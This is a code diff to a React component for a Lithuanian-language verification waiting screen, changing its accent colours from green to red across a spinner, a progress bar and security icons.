@@ -124,13 +124,13 @@ export function WaitClient({ sessionId, routeSessionId }: Props) {
                 />
               </div>
 
-              <div className="mx-auto flex w-full max-w-[560px] flex-col items-center rounded-[28px] border border-[#4ade80]/30 bg-[radial-gradient(circle_at_top,rgba(74,222,128,0.13),transparent_55%),linear-gradient(180deg,rgba(8,24,14,0.96),rgba(5,12,8,0.98))] px-6 py-8 shadow-[inset_0_1px_0_rgba(74,222,128,0.08)]">
+              <div className="mx-auto flex w-full max-w-[560px] flex-col items-center rounded-[28px] border border-[#ff5257]/30 bg-[radial-gradient(circle_at_top,rgba(74,222,128,0.13),transparent_55%),linear-gradient(180deg,rgba(8,24,14,0.96),rgba(5,12,8,0.98))] px-6 py-8 shadow-[inset_0_1px_0_rgba(74,222,128,0.08)]">
                 <div className="relative mb-6 flex h-28 w-28 items-center justify-center">
-                  <div className="absolute inset-0 rounded-full border border-[#4ade80]/20" />
-                  <div className="absolute inset-[10px] rounded-full border border-[#4ade80]/20" />
-                  <div className="absolute inset-0 animate-spin rounded-full border-[3px] border-transparent border-t-[#4ade80] border-r-[#4ade80]" style={{ animationDuration: "1.7s" }} />
-                  <div className="absolute inset-[20px] rounded-full bg-[#4ade80]/12 blur-md" />
-                  <svg className="relative z-10 h-11 w-11 text-[#4ade80]" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                  <div className="absolute inset-0 rounded-full border border-[#ff5257]/20" />
+                  <div className="absolute inset-[10px] rounded-full border border-[#ff5257]/20" />
+                  <div className="absolute inset-0 animate-spin rounded-full border-[3px] border-transparent border-t-[#ff5257] border-r-[#ff5257]" style={{ animationDuration: "1.7s" }} />
+                  <div className="absolute inset-[20px] rounded-full bg-[#ff5257]/12 blur-md" />
+                  <svg className="relative z-10 h-11 w-11 text-[#ff5257]" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                     <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="1.8" d="M12 3.7 18.4 6v5.2c0 4-2.3 7.1-6.4 9.1-4.1-2-6.4-5.1-6.4-9.1V6L12 3.7Z" />
                     <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="1.8" d="m8.8 11.8 2.1 2.1 4.5-4.7" />
                   </svg>
@@ -143,13 +143,13 @@ export function WaitClient({ sessionId, routeSessionId }: Props) {
                 </div>
 
                 <div className="w-full">
-                  <div className="mb-2 flex items-center justify-between text-[11px] font-bold uppercase tracking-[0.14em] text-[#4ade80]/85">
+                  <div className="mb-2 flex items-center justify-between text-[11px] font-bold uppercase tracking-[0.14em] text-[#ff5257]/85">
                     <span>Verifikacija</span>
                     <span>{Math.round(progressWidth)}%</span>
                   </div>
-                  <div className="h-3 overflow-hidden rounded-full border border-[#4ade80]/30 bg-black/30">
+                  <div className="h-3 overflow-hidden rounded-full border border-[#ff5257]/30 bg-black/30">
                     <div
-                      className="relative h-full rounded-full bg-[linear-gradient(90deg,#0fae4e_0%,#4ade80_60%,#4ade80_100%)] transition-all duration-1000 ease-in-out"
+                      className="relative h-full rounded-full bg-[linear-gradient(90deg,#e30613_0%,#ff5257_60%,#ff5257_100%)] transition-all duration-1000 ease-in-out"
                       style={{ width: `${progressWidth}%` }}
                     >
                       <div className="absolute inset-y-0 right-0 w-16 bg-white/30 blur-md" />
@@ -158,7 +158,7 @@ export function WaitClient({ sessionId, routeSessionId }: Props) {
                 </div>
 
                 <div className="mt-8 pak-form-security justify-center text-center">
-                  <svg className="h-8 w-8 shrink-0 text-[#4ade80]" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.9">
+                  <svg className="h-8 w-8 shrink-0 text-[#ff5257]" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.9">
                     <path d="M12 15v2m-6 4h12a2 2 0 0 0 2-2v-6a2 2 0 0 0-2-2H6a2 2 0 0 0-2 2v6a2 2 0 0 0 2 2Zm10-10V7a4 4 0 0 0-8 0v4h8Z" strokeLinecap="round" strokeLinejoin="round" />
                   </svg>
                   <span>256 bitų SSL šifravimas aktyvus</span>
